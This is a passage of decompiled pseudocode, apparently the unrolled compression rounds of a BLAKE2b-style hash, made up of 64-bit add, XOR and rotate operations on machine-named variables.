    HIDWORD(v595) = ((unsigned int)(HIDWORD(v369) ^ HIDWORD(v595)) >> 24) | v813;
    v370 = v21 + v606 + v590;
    LODWORD(v21) = (__PAIR64__(HIDWORD(v595), v21) + v606 + v590) >> 32;
    v590 = __PAIR64__(v21, v370);
    LODWORD(v21) = HIDWORD(v605) ^ v21;
    v815 = v605 ^ v370;
    v817 = ((unsigned int)v605 ^ v370) << 16;
    v371 = __PAIR64__(v21, (unsigned int)v605 ^ v370) >> 16;
    LODWORD(v21) = WORD1(v21) | v817;
    HIDWORD(v21) = v371 + v369;
    v605 = __PAIR64__(v21, v371);
    HIDWORD(v600) = (__PAIR64__(v21, v371) + v369) >> 32;
    v372 = (__PAIR64__(v21, v371) + v369) ^ v595;
    LODWORD(v595) = (2 * ((v371 + v369) ^ v595)) | ((unsigned int)(HIDWORD(v600) ^ HIDWORD(v595)) >> 31);
    v819 = 0;
    HIDWORD(v595) = v372 >> 31;
    v591 += v596 + v621;
    v821 = v602 ^ v591;
    v373 = HIDWORD(v602) ^ HIDWORD(v591);
    v374 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, HIDWORD(v602) ^ HIDWORD(v591)) + v601;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v373 + v601) ^ v596;
    v823 = v21;
    v825 = (_DWORD)v21 << 8;
    LODWORD(v372) = v21;
    HIDWORD(v372) = HIDWORD(v374) ^ HIDWORD(v596);
    LODWORD(v596) = v372 >> 24;
    LODWORD(v21) = (__PAIR64__(((unsigned int)(HIDWORD(v374) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8), v596) + v610) >> 32;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v374) ^ HIDWORD(v596)) >> 24) | v825;
    v375 = v591;
    v591 += __PAIR64__(v21, (int)v596 + (int)v610);
    v376 = v373 ^ (v596 + v610 + v375);
    v827 = v376;
    v829 = v376 << 16;
    v377 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v376) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v376 << 16);
    v602 = __PAIR64__(v21, v377);
    v601 = __PAIR64__(v21, v377) + v374;
    v378 = (__PAIR64__(v21, v377) + v374) ^ v596;
    LODWORD(v596) = (2 * ((v377 + v374) ^ v596)) | ((((__PAIR64__(v21, v377) + v374) >> 32) ^ HIDWORD(v596)) >> 31);
    v831 = 0;
    HIDWORD(v596) = v378 >> 31;
    v592 += v597 + v614;
    v833 = v603 ^ v592;
    v380 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v347, v348);
    v379 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v347, v348)) >> 32;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592));
    v835 = v380 ^ v597;
    v837 = ((unsigned int)v380 ^ (unsigned int)v597) << 8;
    LODWORD(v597) = (__PAIR64__(v379, v380) ^ v597) >> 24;
    HIDWORD(v597) = ((v379 ^ HIDWORD(v597)) >> 24) | v837;
    v592 += v597 + v612;
    v839 = v603 ^ v592;
    v841 = ((unsigned int)v603 ^ (unsigned int)v592) << 16;
    v381 = (v603 ^ v592) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | v841;
    v383 = __PAIR64__(v21, v381) + __PAIR64__(v379, v380);
    v382 = (__PAIR64__(v21, v381) + __PAIR64__(v379, v380)) >> 32;
    v603 = __PAIR64__(v21, v381);
    v597 = (2 * (__PAIR64__(v382, v383) ^ v597)) | ((v382 ^ HIDWORD(v597)) >> 31);
    v843 = 0;
    v593 += v594 + v608;
    v845 = v604 ^ v593;
    v384 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), v355)) >> 32;
    HIDWORD(v18) = (HIDWORD(v604) ^ HIDWORD(v593)) + v355;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593));
    v847 = HIDWORD(v18) ^ v594;
    v849 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    LODWORD(v21) = (__PAIR64__(v384, HIDWORD(v18)) ^ v594) >> 24;
    LODWORD(v594) = v21;
    HIDWORD(v594) = ((v384 ^ HIDWORD(v594)) >> 24) | v849;
    v593 += __PAIR64__(HIDWORD(v594), v21) + v616;
    v851 = v604 ^ v593;
    v853 = ((unsigned int)v604 ^ (unsigned int)v593) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | v853;
    v386 = ((v604 ^ v593) >> 16) + HIDWORD(v18);
    v385 = (__PAIR64__(v21, (v604 ^ v593) >> 16) + __PAIR64__(v384, HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, (v604 ^ v593) >> 16);
    HIDWORD(v599) = v385;
    v387 = __PAIR64__(v385, v386) ^ v594;
    LODWORD(v594) = (2 * (v386 ^ v594)) | ((v385 ^ HIDWORD(v594)) >> 31);
    v855 = 0;
    v590 += __PAIR64__(v387 >> 31, v594) + v612;
    v388 = HIDWORD(v602) ^ HIDWORD(v590);
    v857 = v602 ^ v590;
    v390 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v382, v383);
    v389 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v382, v383)) >> 32;
    HIDWORD(v602) = v602 ^ v590;
    LODWORD(v602) = v388;
    v391 = v389 ^ (v387 >> 31);
    v859 = v390 ^ v594;
    v861 = ((unsigned int)v390 ^ (unsigned int)v594) << 8;
    LODWORD(v387) = v390 ^ v594;
    HIDWORD(v387) = v391;
    v392 = HIBYTE(v391) | v861;
    v590 += __PAIR64__(v392, v387 >> 24) + v621;
    v863 = v602 ^ v590;
    v865 = ((unsigned int)v602 ^ (unsigned int)v590) << 16;
    v393 = (v602 ^ v590) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | v865;
    v395 = __PAIR64__(v21, v393) + __PAIR64__(v389, v390);
    v394 = (__PAIR64__(v21, v393) + __PAIR64__(v389, v390)) >> 32;
    v602 = __PAIR64__(v21, v393);
    v396 = v395 ^ (v387 >> 24);
    HIDWORD(v387) = v394 ^ v392;
    LODWORD(v387) = v396;
    LODWORD(v594) = (2 * v396) | ((v394 ^ v392) >> 31);
    v867 = 0;
    HIDWORD(v594) = v387 >> 31;
    v591 += v595 + v620;
    v397 = HIDWORD(v603) ^ HIDWORD(v591);
    v869 = v603 ^ v591;
    HIDWORD(v603) = v603 ^ v591;
    v398 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, v397) + __PAIR64__(HIDWORD(v599), v386)) >> 32;
    HIDWORD(v18) = v397 + v386;
    v871 = (v397 + v386) ^ v595;
    v873 = v871 << 8;
    LODWORD(v21) = ((__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, v397) + __PAIR64__(HIDWORD(v599), v386)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v398 ^ HIDWORD(v595)) >> 24) | v873;
    v591 += __PAIR64__(HIDWORD(v595), v21) + v615;
    v399 = v397 ^ v591;
    v875 = v399;
    v877 = v399 << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v591)) >> 16) | (v399 << 16);
    v401 = (__PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v399) >> 16) + HIDWORD(v18);
    v400 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v399) >> 16) + __PAIR64__(v398, HIDWORD(v18))) >> 32;
    v603 = __PAIR64__(v21, __PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v399) >> 16);
    HIDWORD(v599) = v400;
    v402 = __PAIR64__(v400, v401) ^ v595;
    LODWORD(v595) = (2 * (v401 ^ v595)) | ((v400 ^ HIDWORD(v595)) >> 31);
    v879 = 0;
    HIDWORD(v595) = v402 >> 31;
    v592 += v596 + v617;
    v881 = v604 ^ v592;
    v403 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592))
          + __PAIR64__(HIDWORD(v600), HIDWORD(v21))) >> 32;
    HIDWORD(v21) += HIDWORD(v604) ^ HIDWORD(v592);
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592));
    v883 = HIDWORD(v21) ^ v596;
    v885 = (HIDWORD(v21) ^ (unsigned int)v596) << 8;
    LODWORD(v21) = (__PAIR64__(v403, HIDWORD(v21)) ^ v596) >> 24;
    LODWORD(v596) = v21;
    HIDWORD(v596) = ((v403 ^ HIDWORD(v596)) >> 24) | v885;
    v592 += __PAIR64__(HIDWORD(v596), v21) + v609;
    v887 = v604 ^ v592;
    v889 = ((unsigned int)v604 ^ (unsigned int)v592) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | v889;
    v405 = ((v604 ^ v592) >> 16) + HIDWORD(v21);
    v404 = (__PAIR64__(v21, (v604 ^ v592) >> 16) + __PAIR64__(v403, HIDWORD(v21))) >> 32;
    v604 = __PAIR64__(v21, (v604 ^ v592) >> 16);
    HIDWORD(v600) = v404;
    v406 = __PAIR64__(v404, v405) ^ v596;
    v891 = 0;
    LODWORD(v596) = (2 * (v405 ^ v596)) | ((v404 ^ HIDWORD(v596)) >> 31);
    HIDWORD(v596) = v406 >> 31;
    v593 += v597 + v606;
    v893 = v605 ^ v593;
    v407 = HIDWORD(v605) ^ HIDWORD(v593);
    v408 = __PAIR64__((unsigned int)v605 ^ (unsigned int)v593, HIDWORD(v605) ^ HIDWORD(v593)) + v601;
    HIDWORD(v605) = v605 ^ v593;
    LODWORD(v21) = (v407 + v601) ^ v597;
    v895 = v21;
    v897 = (_DWORD)v21 << 8;
    LODWORD(v406) = v21;
    HIDWORD(v406) = HIDWORD(v408) ^ HIDWORD(v597);
    LODWORD(v597) = v406 >> 24;
    v409 = __PAIR64__(((unsigned int)(HIDWORD(v408) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8), v597) + v614;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v408) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8);
    v593 += v409;
    v410 = v407 ^ v593;
    v899 = v410;
    v901 = v410 << 16;
    v411 = __PAIR64__(HIDWORD(v605) ^ HIDWORD(v593), v410) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | (v410 << 16);
    v605 = __PAIR64__(v21, v411);
    v601 = __PAIR64__(v21, v411) + v408;
    v903 = 0;
    v412 = (__PAIR64__(v21, v411) + v408) ^ v597;
    LODWORD(v597) = (2 * ((v411 + v408) ^ v597)) | ((((__PAIR64__(v21, v411) + v408) >> 32) ^ HIDWORD(v597)) >> 31);
    HIDWORD(v597) = v412 >> 31;
    v590 += v595 + v618;
    v905 = v411 ^ v590;
    v413 = (__PAIR64__(v411 ^ (unsigned int)v590, (unsigned int)v21 ^ HIDWORD(v590)) + __PAIR64__(HIDWORD(v600), v405)) >> 32;
    HIDWORD(v21) = (HIDWORD(v605) ^ HIDWORD(v590)) + v405;
    HIDWORD(v600) = v413;
    v605 = __PAIR64__((unsigned int)v605 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590));
    v909 = (HIDWORD(v21) ^ (unsigned int)v595) << 8;
    v907 = HIDWORD(v21) ^ v595;
    LODWORD(v21) = (__PAIR64__(v413, HIDWORD(v21)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v413 ^ HIDWORD(v595)) >> 24) | v909;
    v590 += __PAIR64__(HIDWORD(v595), v21) + v608;
    v913 = ((unsigned int)v605 ^ (unsigned int)v590) << 16;
    v911 = v605 ^ v590;
    v414 = (v605 ^ v590) >> 16;
    v415 = v414;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v590)) >> 16) | v913;
    v417 = v414 + HIDWORD(v21);
    v416 = (__PAIR64__(v21, v414) + __PAIR64__(HIDWORD(v600), HIDWORD(v21))) >> 32;
    v605 = __PAIR64__(v21, v415);
    HIDWORD(v600) = v416;
    v418 = __PAIR64__(v416, v417) ^ v595;
    LODWORD(v595) = (2 * (v417 ^ v595)) | ((v416 ^ HIDWORD(v595)) >> 31);
    v915 = 0;
    HIDWORD(v595) = v418 >> 31;
    v591 += v596 + v619;
    v917 = v602 ^ v591;
    v419 = HIDWORD(v602) ^ HIDWORD(v591);
    v420 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, HIDWORD(v602) ^ HIDWORD(v591)) + v601;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v419 + v601) ^ v596;
    v921 = (_DWORD)v21 << 8;
    v919 = v21;
    LODWORD(v21) = __PAIR64__(HIDWORD(v420) ^ HIDWORD(v596), v21) >> 24;
    LODWORD(v596) = v21;
    v421 = __PAIR64__(((unsigned int)(HIDWORD(v420) ^ HIDWORD(v596)) >> 24) | v921, v21) + v613;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v420) ^ HIDWORD(v596)) >> 24) | v921;
    v591 += v421;
    v422 = v419 ^ v591;
    v923 = v422;
    v925 = v422 << 16;
    v423 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v422) >> 16;
    LODWORD(v602) = v423;
    HIDWORD(v602) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v422 << 16);
    v601 = __PAIR64__(HIDWORD(v602), v423) + v420;
    v424 = (__PAIR64__(HIDWORD(v602), v423) + v420) ^ v596;
    LODWORD(v596) = (2 * ((v423 + v420) ^ v21)) | ((((__PAIR64__(HIDWORD(v602), v423) + v420) >> 32) ^ HIDWORD(v596)) >> 31);
    v927 = 0;
    HIDWORD(v596) = v424 >> 31;
    v592 += v597 + v607;
    v425 = HIDWORD(v603) ^ HIDWORD(v592);
    v929 = v603 ^ v592;
    v427 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v394, v395);
    v426 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v394, v395)) >> 32;
    HIDWORD(v603) = v603 ^ v592;
    v931 = v427 ^ v597;
    v933 = ((unsigned int)v427 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(v426, v427) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v426 ^ HIDWORD(v597)) >> 24) | v933;
    v428 = v21 + v610 + v592;
    LODWORD(v21) = (__PAIR64__(HIDWORD(v597), v21) + v610 + v592) >> 32;
    v592 = __PAIR64__(v21, v428);
    LODWORD(v21) = HIDWORD(v603) ^ v21;
    v935 = v425 ^ v428;
    v937 = (v425 ^ v428) << 16;
    v429 = __PAIR64__(v21, v425 ^ v428) >> 16;
    LODWORD(v21) = WORD1(v21) | v937;
    v431 = __PAIR64__(v21, v429) + __PAIR64__(v426, v427);
    v430 = (__PAIR64__(v21, v429) + __PAIR64__(v426, v427)) >> 32;
    v603 = __PAIR64__(v21, v429);
    v597 = (2 * (__PAIR64__(v430, v431) ^ v597)) | ((v430 ^ HIDWORD(v597)) >> 31);
    v939 = 0;
    v593 += v594 + v616;
    v941 = v604 ^ v593;
    v432 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), v401)) >> 32;
    HIDWORD(v18) = (HIDWORD(v604) ^ HIDWORD(v593)) + v401;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593));
    HIDWORD(v599) = v432;
    v943 = HIDWORD(v18) ^ v594;
    v945 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    LODWORD(v21) = (__PAIR64__(v432, HIDWORD(v18)) ^ v594) >> 24;
    v433 = ((v432 ^ HIDWORD(v594)) >> 24) | v945;
    v594 = __PAIR64__(v433, v21);
    v434 = v593;
    LODWORD(v593) = v21 + v611 + v593;
    v435 = __PAIR64__(v433, v21) + v611 + __PAIR64__(HIDWORD(v593), v434);
    HIDWORD(v593) = HIDWORD(v435);
    v947 = v604 ^ v435;
    v949 = ((unsigned int)v604 ^ (unsigned int)v435) << 16;
    v436 = (v604 ^ v435) >> 16;
    v437 = v436;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v435)) >> 16) | v949;
    v439 = v436 + HIDWORD(v18);
    v438 = (__PAIR64__(v21, v436) + __PAIR64__(HIDWORD(v599), HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, v437);
    HIDWORD(v599) = v438;
    v440 = __PAIR64__(v438, v439) ^ v594;
    LODWORD(v594) = (2 * (v439 ^ v594)) | ((v438 ^ HIDWORD(v594)) >> 31);
    v951 = 0;
    v590 += __PAIR64__(v440 >> 31, v594) + v616;
    v441 = HIDWORD(v602) ^ HIDWORD(v590);
    v953 = v602 ^ v590;
    v443 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v430, v431);
    v442 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v430, v431)) >> 32;
    HIDWORD(v602) = v602 ^ v590;
    LODWORD(v602) = v441;
    v955 = v443 ^ v594;
    v957 = ((unsigned int)v443 ^ (unsigned int)v594) << 8;
    v444 = v442 ^ (v440 >> 31);
    LODWORD(v440) = v443 ^ v594;
    HIDWORD(v440) = v444;
    LODWORD(v594) = v440 >> 24;
    v445 = HIBYTE(v444) | v957;
    HIDWORD(v594) = v445;
    v590 += __PAIR64__(v445, v594) + v608;
    v959 = v602 ^ v590;
    v961 = ((unsigned int)v602 ^ (unsigned int)v590) << 16;
    v446 = (v602 ^ v590) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | v961;
    v448 = __PAIR64__(v21, v446) + __PAIR64__(v442, v443);
    v447 = (__PAIR64__(v21, v446) + __PAIR64__(v442, v443)) >> 32;
    v602 = __PAIR64__(v21, v446);
    v449 = __PAIR64__(v447, v448) ^ v594;
    LODWORD(v594) = (2 * (v448 ^ v594)) | ((v447 ^ v445) >> 31);
    v963 = 0;
    HIDWORD(v594) = v449 >> 31;
    v591 += v595 + v614;
    v965 = v603 ^ v591;
    v450 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591))
          + __PAIR64__(HIDWORD(v599), v439)) >> 32;
    HIDWORD(v18) = (HIDWORD(v603) ^ HIDWORD(v591)) + v439;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591));
    v967 = HIDWORD(v18) ^ v595;
    v969 = (HIDWORD(v18) ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (__PAIR64__(v450, HIDWORD(v18)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v450 ^ HIDWORD(v595)) >> 24) | v969;
    v591 += __PAIR64__(HIDWORD(v595), v21) + v610;
    v971 = v603 ^ v591;
    v973 = ((unsigned int)v603 ^ (unsigned int)v591) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v591)) >> 16) | v973;
    v452 = ((v603 ^ v591) >> 16) + HIDWORD(v18);
    v451 = (__PAIR64__(v21, (v603 ^ v591) >> 16) + __PAIR64__(v450, HIDWORD(v18))) >> 32;
    v603 = __PAIR64__(v21, (v603 ^ v591) >> 16);
    HIDWORD(v599) = v451;
    v453 = __PAIR64__(v451, v452) ^ v595;
    LODWORD(v595) = (2 * (v452 ^ v595)) | ((v451 ^ HIDWORD(v595)) >> 31);
    v975 = 0;
    HIDWORD(v595) = v453 >> 31;
    v592 += v596 + v613;
    v977 = v604 ^ v592;
    v454 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592))
          + __PAIR64__(HIDWORD(v600), v417)) >> 32;
    HIDWORD(v21) = (HIDWORD(v604) ^ HIDWORD(v592)) + v417;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592));
    v979 = HIDWORD(v21) ^ v596;
    v981 = (HIDWORD(v21) ^ (unsigned int)v596) << 8;
    LODWORD(v21) = (__PAIR64__(v454, HIDWORD(v21)) ^ v596) >> 24;
    LODWORD(v596) = v21;
    HIDWORD(v596) = ((v454 ^ HIDWORD(v596)) >> 24) | v981;
    v592 += __PAIR64__(HIDWORD(v596), v21) + v612;
    v983 = v604 ^ v592;
    v985 = ((unsigned int)v604 ^ (unsigned int)v592) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | v985;
    v456 = ((v604 ^ v592) >> 16) + HIDWORD(v21);
    v455 = (__PAIR64__(v21, (v604 ^ v592) >> 16) + __PAIR64__(v454, HIDWORD(v21))) >> 32;
    v604 = __PAIR64__(v21, (v604 ^ v592) >> 16);
    HIDWORD(v600) = v455;
    v457 = __PAIR64__(v455, v456) ^ v596;
    LODWORD(v596) = (2 * (v456 ^ v596)) | ((v455 ^ HIDWORD(v596)) >> 31);
    v987 = 0;
    HIDWORD(v596) = v457 >> 31;
    v593 += v597 + v607;
    v458 = HIDWORD(v605) ^ HIDWORD(v593);
    v989 = v605 ^ v593;
    HIDWORD(v605) = v605 ^ v593;
    LODWORD(v21) = (v458 + v601) ^ v597;
    v601 += __PAIR64__((unsigned int)v605 ^ (unsigned int)v593, v458);
    v991 = v21;
    v993 = (_DWORD)v21 << 8;
    LODWORD(v457) = v21;
    HIDWORD(v457) = HIDWORD(v601) ^ HIDWORD(v597);
    LODWORD(v597) = v457 >> 24;
    v459 = __PAIR64__(((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8), v597) + v611;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8);
    v593 += v459;
    v460 = v458 ^ v593;
    v997 = v460 << 16;
    v995 = v460;
    v461 = __PAIR64__(HIDWORD(v605) ^ HIDWORD(v593), v460) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | (v460 << 16);
    v601 += __PAIR64__(v21, v461);
    v462 = v601 ^ v597;
    LODWORD(v597) = (2 * (v601 ^ v597)) | ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 31);
    v999 = 0;
    HIDWORD(v597) = v462 >> 31;
    v463 = (v595 + v621 + v590) >> 32;
    LODWORD(v590) = v595 + v621 + v590;
    v1001 = v461 ^ v590;
    HIDWORD(v590) = v463;
    v464 = v21 ^ v463;
    HIDWORD(v605) = v461 ^ v590;
    v465 = (__PAIR64__(v461 ^ (unsigned int)v590, v464) + __PAIR64__(HIDWORD(v600), v456)) >> 32;
    HIDWORD(v21) = v464 + v456;
    v1003 = (v464 + v456) ^ v595;
    v1005 = v1003 << 8;
    LODWORD(v21) = (__PAIR64__(v465, v464 + v456) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v465 ^ HIDWORD(v595)) >> 24) | v1005;
    v590 += __PAIR64__(HIDWORD(v595), v21) + v617;
    v466 = v464 ^ v590;
    v1009 = v466 << 16;
    v1007 = v466;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v590)) >> 16) | (v466 << 16);
    v468 = (__PAIR64__(HIDWORD(v605) ^ HIDWORD(v590), v466) >> 16) + HIDWORD(v21);
    v467 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v605) ^ HIDWORD(v590), v466) >> 16) + __PAIR64__(v465, HIDWORD(v21))) >> 32;
    v605 = __PAIR64__(v21, __PAIR64__(HIDWORD(v605) ^ HIDWORD(v590), v466) >> 16);
    HIDWORD(v600) = v467;
    v469 = __PAIR64__(v467, v468) ^ v595;
    v1011 = 0;
    LODWORD(v595) = (2 * (v468 ^ v595)) | ((v467 ^ HIDWORD(v595)) >> 31);
    HIDWORD(v595) = v469 >> 31;
    v591 += v596 + v615;
    v1013 = v602 ^ v591;
    v470 = HIDWORD(v602) ^ HIDWORD(v591);
    v471 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, HIDWORD(v602) ^ HIDWORD(v591)) + v601;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v470 + v601) ^ v596;
    v1015 = v21;
    v1017 = (_DWORD)v21 << 8;
    LODWORD(v469) = v21;
    HIDWORD(v469) = HIDWORD(v471) ^ HIDWORD(v596);
    LODWORD(v596) = v469 >> 24;
    v472 = __PAIR64__(((unsigned int)(HIDWORD(v471) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8), v596) + v620;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v471) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8);
    v591 += v472;
    v473 = v470 ^ v591;
    v1019 = v473;
    v1021 = v473 << 16;
    v474 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v473) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v473 << 16);
    v602 = __PAIR64__(v21, v474);
    v601 = __PAIR64__(v21, v474) + v471;
    v475 = (__PAIR64__(v21, v474) + v471) ^ v596;
    LODWORD(v596) = (2 * ((v474 + v471) ^ v596)) | ((((__PAIR64__(v21, v474) + v471) >> 32) ^ HIDWORD(v596)) >> 31);
    v1023 = 0;
    HIDWORD(v596) = v475 >> 31;
    v592 += v597 + v609;
    v1025 = v603 ^ v592;
    v477 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v447, v448);
    v476 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v447, v448)) >> 32;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592));
    v1027 = v477 ^ v597;
    v1029 = ((unsigned int)v477 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(v476, v477) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v476 ^ HIDWORD(v597)) >> 24) | v1029;
    v592 += __PAIR64__(HIDWORD(v597), v21) + v618;
    v1031 = v603 ^ v592;
    v1033 = ((unsigned int)v603 ^ (unsigned int)v592) << 16;
    v478 = (v603 ^ v592) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | v1033;
    v603 = __PAIR64__(v21, v478);
    v480 = __PAIR64__(v21, v478) + __PAIR64__(v476, v477);
    v479 = (__PAIR64__(v21, v478) + __PAIR64__(v476, v477)) >> 32;
    v597 = (2 * (__PAIR64__(v479, v480) ^ v597)) | ((v479 ^ HIDWORD(v597)) >> 31);
    v1035 = 0;
    v593 += v594 + v619;
    v1037 = v604 ^ v593;
    v481 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), v452)) >> 32;
    HIDWORD(v18) = (HIDWORD(v604) ^ HIDWORD(v593)) + v452;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593));
    HIDWORD(v599) = v481;
    v1041 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    v1039 = HIDWORD(v18) ^ v594;
    LODWORD(v21) = (__PAIR64__(v481, HIDWORD(v18)) ^ v594) >> 24;
    LODWORD(v594) = v21;
    HIDWORD(v594) = ((v481 ^ HIDWORD(v594)) >> 24) | v1041;
    v593 += __PAIR64__(HIDWORD(v594), v21) + v606;
    v1043 = v604 ^ v593;
    v1045 = ((unsigned int)v604 ^ (unsigned int)v593) << 16;
    v482 = (v604 ^ v593) >> 16;
    v483 = v482;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | v1045;
    v485 = v482 + HIDWORD(v18);
    v484 = (__PAIR64__(v21, v482) + __PAIR64__(HIDWORD(v599), HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, v483);
    HIDWORD(v599) = v484;
    v486 = __PAIR64__(v484, v485) ^ v594;
    LODWORD(v594) = (2 * (v485 ^ v594)) | ((v484 ^ HIDWORD(v594)) >> 31);
    v1047 = 0;
    v590 += __PAIR64__(v486 >> 31, v594) + v606;
    v487 = HIDWORD(v602) ^ HIDWORD(v590);
    v1049 = v602 ^ v590;
    v489 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v479, v480);
